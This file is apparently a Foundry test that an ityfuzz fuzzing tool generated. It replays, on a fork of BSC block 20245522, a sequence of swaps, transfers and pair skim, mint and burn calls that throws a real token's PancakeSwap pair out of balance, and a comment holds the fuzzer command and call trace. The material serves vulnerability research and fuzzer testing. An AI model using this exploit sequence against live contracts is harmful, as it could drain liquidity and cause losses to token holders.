// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0x202b233735bF743FA31abb8f71e641970161bF98,0xa361433E409Adac1f87CDF133127585F8a93c67d,0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE,0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370,0x34bd6dba456bc31c2b3393e499fa10bed32a9370,0x93c175439726797dcee24d08e4ac9164e88e7aee -c bsc --onchain-block-number 20245522 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Imbalanced Uniswap Pair]: In Uniswap pair 0xa361433e409adac1f87cdf133127585f8a93c67d, reserves has changed from (0x00000000000000000000000000000000000000000046b0ba54b0b20f49a365ff_U256, 0x000000000000000000000000000000000000000000003933592b46ae7556bc50_U256) to (0x00000000000000000000000000000000000000000046b0ba54b0b20f49a37d60_U256, 0x000000000000000000000000000000000000000000003933592b46ae7556bc50_U256). It is likely the token contract has incorrectly burned that token in the pair.

================ Trace ================
[38;2;211;29;219m[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactETHForTokens{value: [38;2;153;0;204m3529139271035400.6537 ether}(0, path:(WETH → [38;2;97;191;152m0x202b233735bF743FA31abb8f71e641970161bF98), address(this), block.timestamp);
   ├─[1] [38;2;97;191;152m0x202b233735bF743FA31abb8f71e641970161bF98.[38;2;255;123;114mtransfer([38;2;205;121;221m0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 12609)
   ├─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactTokensForETH(100% Balance, 0, path:(* → WETH), address(this), block.timestamp);
   ├─[1] [38;2;97;191;152m0x202b233735bF743FA31abb8f71e641970161bF98.[38;2;255;123;114mtransfer([38;2;220;144;36m0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 10880332.3765 ether)
   └─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactTokensForETH(100% Balance, 0, path:(* → WETH), address(this), block.timestamp);
[38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] [38;2;97;191;152m0x202b233735bF743FA31abb8f71e641970161bF98.[38;2;255;123;114mtransfer([38;2;147;198;125m0xa361433E409Adac1f87CDF133127585F8a93c67d, 10000.0 ether)
   ├─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactTokensForETH(100% Balance, 0, path:(* → WETH), address(this), block.timestamp);
   ├─[1] [38;2;147;198;125m0xa361433E409Adac1f87CDF133127585F8a93c67d.[38;2;255;123;114mswap(0.4503 ether, 6493, [38;2;235;13;174m0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 0x55d398326f99059ff775485246999027b3197955)
   │  ├─[2] [38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   ├─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactTokensForETH(100% Balance, 0, path:(* → WETH), address(this), block.timestamp);
   │  │  ├─[3] [38;2;235;13;174m0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE.[38;2;255;123;114mreceive()
   │  │  └─[2] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactTokensForETH(100% Balance, 0, path:(* → WETH), address(this), block.timestamp);
   ├─[1] [38;2;235;13;174m0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE.[38;2;255;123;114mskim([38;2;147;198;125m0xa361433E409Adac1f87CDF133127585F8a93c67d)
   ├─[1] [38;2;97;191;152m0x202b233735bF743FA31abb8f71e641970161bF98.[38;2;255;123;114mtransfer([38;2;147;198;125m0xa361433E409Adac1f87CDF133127585F8a93c67d, 16777216)
   └─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactTokensForETH(100% Balance, 0, path:(* → WETH), address(this), block.timestamp);
[38;2;211;29;219m[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] [38;2;147;198;125m0xa361433E409Adac1f87CDF133127585F8a93c67d.[38;2;255;123;114mmint([38;2;147;198;125m0xa361433E409Adac1f87CDF133127585F8a93c67d)
   └─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactTokensForETH(100% Balance, 0, path:(* → WETH), address(this), block.timestamp);
[38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] [38;2;147;198;125m0xa361433E409Adac1f87CDF133127585F8a93c67d.[38;2;255;123;114mburn([38;2;156;133;16m0xe1A425f1AC34A8a441566f93c82dD730639c8510)


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 20245522);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        address[] memory path0 = new address[]();
        path0[0] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        path0[1] = 0x55d398326f99059fF775485246999027B3197955;
        path0[2] = 0x202b233735bF743FA31abb8f71e641970161bF98;
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 3529139271035400.6537 ether);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 3529139271035400.6537 ether
        }(0, path0, address(this), block.timestamp);
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).transfer(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 12609);
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).balanceOf(address(this));
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).approve(router, amount0);
        address[] memory liq_path0 = new address[]();
        liq_path0[0] = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
        liq_path0[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        liq_path0[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).transfer(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 10880332.3765 ether);
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount1 = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).balanceOf(address(this));
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).approve(router, amount1);
        address[] memory liq_path1 = new address[]();
        liq_path1[0] = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
        liq_path1[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        liq_path1[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount1);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount1, 0, liq_path1, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).transfer(0xa361433E409Adac1f87CDF133127585F8a93c67d, 10000.0 ether);
        vm.startPrank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        uint256 amount2 = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).balanceOf(address(this));
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).approve(router, amount2);
        address[] memory liq_path2 = new address[]();
        liq_path2[0] = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
        liq_path2[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        liq_path2[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, amount2);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount2, 0, liq_path2, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        0xa361433E409Adac1f87CDF133127585F8a93c67d.call(abi.encodeWithSelector(
            0x022c0d9f, 0.4503 ether, 6493, 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 0x55d398326f99059ff775485246999027b3197955
        ));
        vm.startPrank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        uint256 amount3 = IERC20(0xa361433E409Adac1f87CDF133127585F8a93c67d).balanceOf(address(this));
        IERC20(0xa361433E409Adac1f87CDF133127585F8a93c67d).approve(router, amount3);
        address[] memory liq_path3 = new address[]();
        liq_path3[0] = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
        liq_path3[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        liq_path3[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, amount3);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount3, 0, liq_path3, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE).skim(0xa361433E409Adac1f87CDF133127585F8a93c67d);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).transfer(0xa361433E409Adac1f87CDF133127585F8a93c67d, 16777216);
        vm.startPrank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        uint256 amount4 = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).balanceOf(address(this));
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98).approve(router, amount4);
        address[] memory liq_path4 = new address[]();
        liq_path4[0] = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
        liq_path4[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        liq_path4[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, amount4);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount4, 0, liq_path4, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0xa361433E409Adac1f87CDF133127585F8a93c67d).mint(0xa361433E409Adac1f87CDF133127585F8a93c67d);
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount5 = IERC20(0xa361433E409Adac1f87CDF133127585F8a93c67d).balanceOf(address(this));
        IERC20(0xa361433E409Adac1f87CDF133127585F8a93c67d).approve(router, amount5);
        address[] memory liq_path5 = new address[]();
        liq_path5[0] = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
        liq_path5[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        liq_path5[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount5);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount5, 0, liq_path5, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0xa361433E409Adac1f87CDF133127585F8a93c67d).burn(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
